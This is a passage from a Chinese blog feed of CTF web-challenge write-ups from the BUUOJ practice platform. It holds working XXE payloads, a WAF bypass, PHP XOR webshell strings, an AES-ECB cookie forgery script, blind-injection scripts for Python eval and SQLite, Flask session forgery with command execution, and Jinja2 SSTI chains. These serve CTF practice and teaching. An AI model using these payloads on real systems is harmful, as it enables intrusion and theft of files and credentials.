Quals]Bnv</h3><ul><li><p>考点</p><p>本地XXE</p></li><li><p>解题过程</p></li></ul><p>ubuntu系统自带<code>/usr/share/yelp/dtd/docbookx.dtd</code>文件</p><p>它定义了很多参数实体并调用,所以我们可以在内部重写一个该dtd文件中含有的参数实体,如<code>ISOmaso</code></p><p>然后在xml中。重写dtd。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message[</span><br><span class="line">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;yelp&#x2F;dtd&#x2F;docbookx.dtd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % ISOamso &#39;</span><br><span class="line">&lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;nonexistent&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">&amp;#x25;eval;</span><br><span class="line">&amp;#x25;error;</span><br><span class="line">&#39;&gt;</span><br><span class="line">%local_dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/28/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%94%EF%BC%89/image-20200428215857519.png" alt></p><p>参考资料：</p><blockquote><p><a href="http://yugod.xmutsec.com/index.php/2019/07/14/50.html" target="_blank" rel="noopener">http://yugod.xmutsec.com/index.php/2019/07/14/50.html</a></p></blockquote><h3 id="0x-05-BSidesCF-2019-SVGMagic"><a href="#0x-05-BSidesCF-2019-SVGMagic" class="headerlink" title="0x 05 [BSidesCF 2019]SVGMagic"></a>0x 05 [BSidesCF 2019]SVGMagic</h3><ul><li><p>考点</p><p>xxe</p></li><li><p>解题过程</p></li></ul><p>svg 其实就是 xml, 所以还是 xxe,读取当前进程中的flag，payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;flag.txt&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;svg height&#x3D;&quot;100&quot; width&#x3D;&quot;1000&quot;&gt;</span><br><span class="line">  &lt;text x&#x3D;&quot;10&quot; y&#x3D;&quot;20&quot;&gt;&amp;file;&lt;&#x2F;text&gt;</span><br><span class="line">&lt;&#x2F;svg&gt;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/28/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%94%EF%BC%89/image-20200429100043967.png" alt></p><h3 id="0x-06-CSAWQual-2019-Web-Unagi"><a href="#0x-06-CSAWQual-2019-Web-Unagi" class="headerlink" title="0x 06 [CSAWQual 2019]Web_Unagi"></a>0x 06 [CSAWQual 2019]Web_Unagi</h3><ul><li><p>考点</p><p>xxe</p></li><li><p>解题过程</p></li></ul><p>根据题目提示构造XXEpayload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&#39;1.0&#39;?&gt;</span><br><span class="line">&lt;!DOCTYPE users [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot; &gt;]&gt;</span><br><span class="line">&lt;users&gt;</span><br><span class="line">    &lt;user&gt;</span><br><span class="line">        &lt;username&gt;bob&lt;&#x2F;username&gt;</span><br><span class="line">        &lt;password&gt;passwd2&lt;&#x2F;password&gt;</span><br><span class="line">        &lt;name&gt; Bob&lt;&#x2F;name&gt;</span><br><span class="line">        &lt;email&gt;bob@fakesite.com&lt;&#x2F;email&gt;  </span><br><span class="line">        &lt;group&gt;CSAW2019&lt;&#x2F;group&gt;</span><br><span class="line">        &lt;intro&gt;&amp;xxe;&lt;&#x2F;intro&gt;</span><br><span class="line">    &lt;&#x2F;user&gt;</span><br><span class="line">&lt;&#x2F;users&gt;</span><br></pre></td></tr></table></figure><p>但是被waf掉了，可以通过编码转换绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iconv -f utf8 -t utf16 simple.xml&gt;1.xml</span><br></pre></td></tr></table></figure><h3 id="0x-07-ISITDTU-2019-EasyPHP"><a href="#0x-07-ISITDTU-2019-EasyPHP" class="headerlink" title="0x 07 [ISITDTU 2019]EasyPHP"></a>0x 07 [ISITDTU 2019]EasyPHP</h3><ul><li><p>考点</p><p>特殊webshell</p></li><li><p>解题过程</p></li></ul><p>由于php的动态特性，PHP默认会把没有加引号的字符串当成常量处理，找不到对应常量就会将其解释成字符串，因此没有引号不是限制。</p><p>另外还有一点，PHP调用函数，可以使用字符串调用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">final_string&#x3D;&quot;phpinfo&quot;</span><br><span class="line">allowed&#x3D;&quot;!#%()*+-&#x2F;:;&lt;&#x3D;&gt;?@ABCHIJKLMNQRTUVWXYZ\]^abchijklmnqrtuvwxyz&#125;~&quot;</span><br><span class="line">for a in final_string:    </span><br><span class="line">    for i in allowed:</span><br><span class="line">        for p in allowed:</span><br><span class="line">            if ord(i)^ord(p)&#x3D;&#x3D;ord(a):</span><br><span class="line">                print(&quot;i&#x3D;%s p&#x3D;%s a&#x3D;%s&quot;%(i,p,a))</span><br></pre></td></tr></table></figure><p>暴力搜索符合条件的字符串，例如：phpinfo==%8f%97%8f%96%91%99%90^%ff%ff%ff%ff%ff%ff%ff。</p><p>除了必要的<code>()^;</code>以外，我们最多剩余9个字符的空间，可以通过爆破的方式进行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">result2 &#x3D; [0x8b, 0x9b, 0xa0, 0x9c, 0x8f, 0x91, 0x9e, 0xd1, 0x96, 0x8d, 0x8c]  # Original chars,11 total</span><br><span class="line">result &#x3D; [0x9b, 0xa0, 0x9c, 0x8f, 0x9e, 0xd1, 0x96, 0x8c]  # to be deleted</span><br><span class="line">temp &#x3D; []</span><br><span class="line">for d in result2:</span><br><span class="line">    for a in result:</span><br><span class="line">        for b in result:</span><br><span class="line">            for c in result:</span><br><span class="line">                if (a ^ b ^ c &#x3D;&#x3D; d):</span><br><span class="line">                    if a &#x3D;&#x3D; b &#x3D;&#x3D; c &#x3D;&#x3D; d:</span><br><span class="line">                        continue</span><br><span class="line">                    else:</span><br><span class="line">                        print(&quot;a&#x3D;0x%x,b&#x3D;0x%x,c&#x3D;0x%x,d&#x3D;0x%x&quot; % (a, b, c, d))</span><br><span class="line">                        if d not in temp:</span><br><span class="line">                            temp.append(d)</span><br><span class="line">print(len(temp), temp)</span><br></pre></td></tr></table></figure><p>结果：<code>print_r(scandir(.));==((%9b%9c%9b%9b%9b%9b%9c)^(%9b%8f%9b%9c%9c%9b%8f)^(%8f%9e%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff))(((%9b%9b%9b%9b%9b%9b%9c)^(%9b%9b%9b%9c%a0%9b%8f)^(%8c%9c%9e%96%a0%96%9e)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));</code></p><p><img src="/2020/04/28/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%94%EF%BC%89/image-20200430232813996.png" alt></p><p>最后payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(end(scandir(.)));&#x3D;&#x3D;((%8d%9c%97%a0%88%8d%97%8d%9c%a0%a0)^(%9a%97%9b%88%a0%9a%9b%9b%8d%9c%9a)^(%9b%9c%9c%a0%88%9b%9c%9c%9c%a0%a0)^(%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff))(((%a0%97%8d)^(%9a%9a%9b)^(%a0%9c%8d)^(%ff%ff%ff))(((%8d%a0%88%97%8d%9b%9c)^(%9a%9c%8d%9a%9b%9a%8d)^(%9b%a0%9b%9c%8d%97%9c)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)));</span><br></pre></td></tr></table></figure><p>参考资料：</p><blockquote><p><a href="https://tiaonmmn.github.io/2019/07/18/ISITDTU-Easy-PHP/" target="_blank" rel="noopener">https://tiaonmmn.github.io/2019/07/18/ISITDTU-Easy-PHP/</a></p></blockquote><h3 id="0x-08-BSidesCF-2019-Mixer"><a href="#0x-08-BSidesCF-2019-Mixer" class="headerlink" title="0x 08 [BSidesCF 2019]Mixer"></a>0x 08 [BSidesCF 2019]Mixer</h3><ul><li><p>考点</p><p>AES 的 ECB 翻转攻击</p></li><li><p>解题过程</p></li></ul><p>burp设置跟随重定向  </p><p><img src="/2020/04/28/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%94%EF%BC%89/image-20200501225143645.png" alt></p><p>根据题目的提示修改cookie发现报错，得到原文信息大致为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;first_name&quot;:&quot;xxx&quot;,&quot;last_name&quot;:&quot;xxx&quot;,&quot;is_admin&quot;:0&#125;</span><br></pre></td></tr></table></figure><p>可以推测是 ECB 加密, 如果是 CBC 的话, 前面也会变成乱码,我们知道 ECB 加密是 16 位一组, 并且每组互相独立, 加密后为 32 位,而这里的目标是让<code>is_admin</code>变成 1, 单纯的翻转的话不太好操作, 毕竟我们不知道 IV.json有个特性：<code>1.0 = 1</code></p><p>那么我们尝试构造如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;first_name&quot;:&quot;A</span><br><span class="line">1.00000000000000</span><br><span class="line">&quot;,&quot;last_name&quot;:&quot;p</span><br><span class="line">aww&quot;,&quot;is_admin&quot;:</span><br><span class="line">0&#125;</span><br></pre></td></tr></table></figure><p>所以我们可以分为5块，而加密后是以16进制表示的，所以我们需要的第二块就在<code>32-64</code>，我们把这块加在倒数第二块。第二块的值为<code>1.00000000000000</code>最后一块为0}，所以结合起来就是<code>1.000000000000000}</code>，再与之前的结合.整体就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;first_name&quot;:&quot;A1.00000000000000&quot;,&quot;last_name&quot;:&quot;paww&quot;,&quot;is_admin&quot;:1.000000000000000&#125;</span><br></pre></td></tr></table></figure><p>exp如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import requests,re</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;c40cb849-de86-41c4-9b19-74e70fb66483.node3.buuoj.cn&#x2F;&quot;</span><br><span class="line">action &#x3D; &quot;&quot;&quot;?action&#x3D;login&amp;first_name&#x3D;A1.00000000000000&amp;last_name&#x3D;paww&quot;&quot;&quot;</span><br><span class="line">r &#x3D; requests.get(url + action, verify&#x3D;False, allow_redirects&#x3D;False) #取消认证和禁止重定向</span><br><span class="line">for c in r.cookies:</span><br><span class="line">    print(c.name, c.value)</span><br><span class="line">    if c.name &#x3D;&#x3D; &quot;user&quot;:</span><br><span class="line">        c.value &#x3D; c.value[:-32] + c.value[32:64] + c.value[-32:]</span><br><span class="line"></span><br><span class="line">resp &#x3D; requests.get(url, cookies&#x3D;r.cookies, verify&#x3D;False, allow_redirects&#x3D;False)</span><br><span class="line"></span><br><span class="line">print(resp.text)</span><br></pre></td></tr></table></figure><p>参考资料：</p><blockquote><p><a href="https://cjm00n.top/CTF/Buu刷题记录3.html#BSidesCF-2019-Pick-Tac-Toe" target="_blank" rel="noopener">https://cjm00n.top/CTF/Buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%953.html#BSidesCF-2019-Pick-Tac-Toe</a></p><p><a href="https://blog.csdn.net/a3320315/article/details/104335989" target="_blank" rel="noopener">https://blog.csdn.net/a3320315/article/details/104335989</a></p></blockquote><h3 id="0x-09-PyCalX-1-amp-2"><a href="#0x-09-PyCalX-1-amp-2" class="headerlink" title="0x 09 PyCalX 1&amp;2"></a>0x 09 PyCalX 1&amp;2</h3><ul><li><p>考点</p><p>布尔盲注、</p></li><li><p>解题过程</p></li></ul><ol><li>首先分析关键代码如下：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">FLAG &#x3D; open(&#39;&#x2F;var&#x2F;www&#x2F;flag&#39;,&#39;r&#39;).read()</span><br><span class="line">source &#x3D; arguments[&#39;source&#39;].value</span><br><span class="line">def get_value(val):</span><br><span class="line">    val &#x3D; str(val)[:64]</span><br><span class="line">    if str(val).isdigit(): return int(val)</span><br><span class="line">    blacklist &#x3D; [&#39;(&#39;,&#39;)&#39;,&#39;[&#39;,&#39;]&#39;,&#39;\&#39;&#39;,&#39;&quot;&#39;] # I don&#39;t like tuple, list and dict.</span><br><span class="line">    if val &#x3D;&#x3D; &#39;&#39; or [c for c in blacklist if c in val] !&#x3D; []:</span><br><span class="line">        print(&#39;&lt;center&gt;Invalid value&lt;&#x2F;center&gt;&#39;)</span><br><span class="line">        sys.exit(0)</span><br><span class="line">    return val</span><br><span class="line">def get_op(val):</span><br><span class="line">    val &#x3D; str(val)[:2]</span><br><span class="line">    list_ops &#x3D; [&#39;+&#39;,&#39;-&#39;,&#39;&#x2F;&#39;,&#39;*&#39;,&#39;&#x3D;&#39;,&#39;!&#39;]</span><br><span class="line">    if val &#x3D;&#x3D; &#39;&#39; or val[0] not in list_ops:</span><br><span class="line">        print(&#39;&lt;center&gt;Invalid op&lt;&#x2F;center&gt;&#39;)</span><br><span class="line">        sys.exit(0)</span><br><span class="line">    return val</span><br><span class="line">op &#x3D; get_op(arguments[&#39;op&#39;].value)</span><br><span class="line">value1 &#x3D; get_value(arguments[&#39;value1&#39;].value)</span><br><span class="line">value2 &#x3D; get_value(arguments[&#39;value2&#39;].value)</span><br><span class="line">calc_eval &#x3D; str(repr(value1)) + str(op) + str(repr(value2))</span><br></pre></td></tr></table></figure><p>题目的功能类似于一个计算器。<br>计算结果为value1+op+value2，其中value1和2不能出现<code>&quot;()[]\&#39;</code>，op的第一个字符只能是<code>+-/*=!</code></p><p>repr函数在处理字符串的时候会自己给加上引号</p><p><img src="/2020/04/28/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%94%EF%BC%89/image-20200505063401016.png" alt></p><p>因为op限定开头但没有限定第二个字符，我们可以插入单引号。并且注释后面的单引号进行逃逸</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39;test&#39; +&#39;&#39; and source in flag#</span><br><span class="line">value1&#39;    op       value2</span><br></pre></td></tr></table></figure><p><img src="/2020/04/28/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%94%EF%BC%89/image-20200505063613729.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;2cc20ee8-8b8c-491e-81f0-2465837dcc5f.node3.buuoj.cn&#x2F;cgi-bin&#x2F;pycalx.py?value1&#x3D;f&amp;op&#x3D;%2b&#39;&amp;value2&#x3D;+and+True+and+source+in+FLAG%23&amp;source&#x3D;&quot;</span><br><span class="line">s&#x3D;&#39;abcdefghijkmnlopqrstuvwxyz0123456789-&#125;&#39;</span><br><span class="line">flag&#x3D;&#39;flag&#123;&#39;</span><br><span class="line">for a in range(50):</span><br><span class="line">    for i in s:</span><br><span class="line">        r&#x3D;requests.get(url&#x3D;url+flag+i).text</span><br><span class="line">        print(url+flag+i)</span><br><span class="line">        if &#39;False&#39;  not in r:</span><br><span class="line">            print(flag)</span><br><span class="line">            flag+&#x3D;i</span><br><span class="line">            break</span><br></pre></td></tr></table></figure><p>第一小题的op获取是这样的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">op &#x3D; get_op(arguments[&#39;op&#39;].value)</span><br></pre></td></tr></table></figure><p>第二小题是这样的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">op &#x3D; get_op(get_value(arguments[&#39;op&#39;].value))</span><br></pre></td></tr></table></figure><p>过滤了单引号这里使用<code>F-strings</code>，它支持表达式运算。<br><code>value1</code> = <code>True</code> ，<code>value2</code> =<code>{source*0 if source in FLAG else 233}</code> ，<code>op</code> = <code>+f</code><br>执行的代码为：<br><code>&#39;True&#39;+f&#39;{source*0 if source in FLAG else 233}&#39;</code></p><p><strong>如果匹配成功返回<code>True</code>，匹配失败返回<code>True233</code></strong></p><p>buuoj一直打不出来很迷</p><h3 id="0x-10-watevrCTF-2019-Supercalc"><a href="#0x-10-watevrCTF-2019-Supercalc" class="headerlink" title="0x 10 [watevrCTF-2019]Supercalc"></a>0x 10 [watevrCTF-2019]Supercalc</h3><ul><li><p>考点</p><p>flask session伪造、ssti</p></li><li><p>解题过程</p></li></ul><p>利用<code>1/0#</code>读取flask  session加密所用的key值，由于他的计算代码是存储在session中的，伪造cookie执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3.6 flask_session_cookie_manager3.py encode -s &quot;cded826a1e89925035cc05f0907855f7&quot; -t &quot;&#123;&#39;history&#39;:[&#123;&#39;code&#39;:&#39;__import__(\&quot;os\&quot;).popen(\&quot;ls -a\&quot;).read()&#39;&#125;]&#125;&quot;</span><br><span class="line">发现存在flag.txt文件</span><br><span class="line">python3.6 flask_session_cookie_manager3.py encode -s &quot;cded826a1e89925035cc05f0907855f7&quot; -t &quot;&#123;&#39;history&#39;:[&#123;&#39;code&#39;:&#39;__import__(\&quot;os\&quot;).popen(\&quot;cat flag.txt\&quot;).read()&#39;&#125;]&#125;&quot;</span><br><span class="line">读取flag</span><br></pre></td></tr></table></figure><h3 id="0x-11-BSidesCF-2019-Sequel"><a href="#0x-11-BSidesCF-2019-Sequel" class="headerlink" title="0x 11 [BSidesCF 2019]Sequel"></a>0x 11 [BSidesCF 2019]Sequel</h3><ul><li><p>考点 </p><p>sqlite注入</p></li><li><p>解题过程</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">URL &#x3D; &#39;http:&#x2F;&#x2F;d2303429-2d9f-4353-b4c5-737c9b6b084f.node3.buuoj.cn&#x2F;sequels&#39;</span><br><span class="line">LETTERS &#x3D; string.printable</span><br><span class="line">target &#x3D; &quot;&quot;</span><br><span class="line">while True:</span><br><span class="line">    f &#x3D; False</span><br><span class="line">    for e in LETTERS:</span><br><span class="line">        tmp &#x3D; target + e</span><br><span class="line">        payload &#x3D; r&#39;&#123;&#123;&quot;username&quot;:&quot;\&quot; or CASE WHEN SUBSTR((SELECT name FROM sqlite_master limit 0,1),&#123;&#125;,1)&#x3D;\&quot;&#123;&#125;\&quot; THEN true ELSE false END or \&quot;&quot;,&quot;password&quot;:&quot;guest&quot;&#125;&#125;&#39;.format(len(tmp), e)</span><br><span class="line">        # payload &#x3D; r&#39;&#123;&#123;&quot;username&quot;:&quot;\&quot; or CASE WHEN SUBSTR((SELECT username FROM userinfo limit 1,1),&#123;&#125;,1)&#x3D;\&quot;&#123;&#125;\&quot; THEN true ELSE false END or \&quot;&quot;,&quot;password&quot;:&quot;guest&quot;&#125;&#125;&#39;.format(len(tmp),e)</span><br><span class="line">        # payload &#x3D; r&#39;&#123;&#123;&quot;username&quot;:&quot;\&quot; or CASE WHEN SUBSTR((SELECT password FROM userinfo limit 1,1),&#123;&#125;,1)&#x3D;\&quot;&#123;&#125;\&quot; THEN true ELSE false END or \&quot;&quot;,&quot;password&quot;:&quot;guest&quot;&#125;&#125;&#39;.format(len(tmp),e)</span><br><span class="line">        payload &#x3D; base64.b64encode(payload.encode(&#39;utf-8&#39;)).decode(&quot;utf-8&quot;)</span><br><span class="line">        req &#x3D; requests.Request(&#39;GET&#39;,URL,cookies&#x3D;&#123;&quot;1337_AUTH&quot;: payload&#125;)</span><br><span class="line"></span><br><span class="line">        prepared &#x3D; req.prepare()</span><br><span class="line">        s &#x3D; requests.Session()</span><br><span class="line">        r &#x3D; s.send(prepared, allow_redirects&#x3D;False)</span><br><span class="line">        if &quot;Movie&quot; in r.text:</span><br><span class="line">            target &#x3D; tmp</span><br><span class="line">            print(target)</span><br><span class="line">            f &#x3D; True</span><br><span class="line">            break</span><br><span class="line">    if f: continue</span><br><span class="line">    exit()</span><br></pre></td></tr></table></figure><p>得到管理员账号和密码登录得到flag</p><h3 id="0x-12-入群题2"><a href="#0x-12-入群题2" class="headerlink" title="0x 12 入群题2"></a>0x 12 入群题2</h3><ul><li><p>考点</p><p>SQL注入、mysql客户端恶意文件读取、php版本特性</p></li><li><p>解题过程</p></li></ul><ol><li>登录框存在SQL注入，利用反斜杠转义，用with group来构造token返回结果为空，最终payload如下：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;\&amp;password&#x3D;||1 group by token with rollup having token is NULL--+&amp;question&#x3D;1</span><br></pre></td></tr></table></figure><ol start="2"><li>登录进去发现PHP版本5.2.17，在查看数据的这一部分通过网络请求发现可以路径，使用%00截断进行目录遍历，查看根目录重要文件如下：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">I_am_password_8e7y3262ye9h3sdu2hs9qw</span><br><span class="line">I_am_flag2ijwy2w7892yw2uowh2</span><br></pre></td></tr></table></figure><p><img src="/2020/04/28/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%94%EF%BC%89/image-20200428205315835.png" alt></p><ol start="3"><li>同时还发现该系统有数据备份功能，可以使用mysql任意文件读取进行获取flag。</li></ol><p>​         利用脚本：<a href="https://github.com/Gifts/Rogue-MySql-Server" target="_blank" rel="noopener">https://github.com/Gifts/Rogue-MySql-Server</a></p><h3 id="0x-13-CSCCTF-2019-Qual-FlaskLight"><a href="#0x-13-CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="0x 13 [CSCCTF 2019 Qual]FlaskLight"></a>0x 13 [CSCCTF 2019 Qual]FlaskLight</h3><ul><li><p>考点</p><p>flask ssti</p></li><li><p>解题过程</p></li></ul><p>利用<code>subprocess.Popen</code>执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import html</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">index &#x3D; 0</span><br><span class="line">for i in range(170, 1000):</span><br><span class="line">    try:</span><br><span class="line">        url &#x3D; &quot;http:&#x2F;&#x2F;fd353abb-9623-450c-a960-d91d0ad9c8a3.node3.buuoj.cn&#x2F;?search&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[&quot; + str(i) + &quot;]&#125;&#125;&quot;</span><br><span class="line">        r &#x3D; requests.get(url)</span><br><span class="line">        res &#x3D; re.findall(&quot;&lt;h2&gt;You searched for:&lt;\&#x2F;h2&gt;\W+&lt;h3&gt;(.*)&lt;\&#x2F;h3&gt;&quot;, r.text)</span><br><span class="line">        time.sleep(0.1)</span><br><span class="line">        # print(res)</span><br><span class="line">        # print(r.text)</span><br><span class="line">        res &#x3D; html.unescape(res[0])</span><br><span class="line">        print(str(i) + &quot; | &quot; + res)</span><br><span class="line">        print(res)</span><br><span class="line">        if &quot;subprocess.Popen&quot; in res:</span><br><span class="line">            index &#x3D; i</span><br><span class="line">            break</span><br><span class="line">    except:</span><br><span class="line">        continue</span><br><span class="line">print(&quot;indexo of subprocess.Popen:&quot; + str(index))</span><br></pre></td></tr></table></figure><p>得到在258位，剩下的如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?search&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;</span><br><span class="line"></span><br><span class="line">?search&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls &#x2F;flasklight&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;</span><br><span class="line"></span><br><span class="line">?search&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x-01-PASECA2019-honey-shop&quot;&gt;&lt;a href=&quot;#0x-01-PASECA2019-honey-shop&quot; class=&quot;headerlink&quot; title=&quot;0x 01 [PASECA2019]honey_shop&quot;&gt;&lt;/a&gt;0x 0
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>安恒杯四月月赛题解</title>
    <link href="http://yoursite.com/2020/04/25/%E5%AE%89%E6%81%92%E6%9D%AF%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E8%A7%A3/"/>
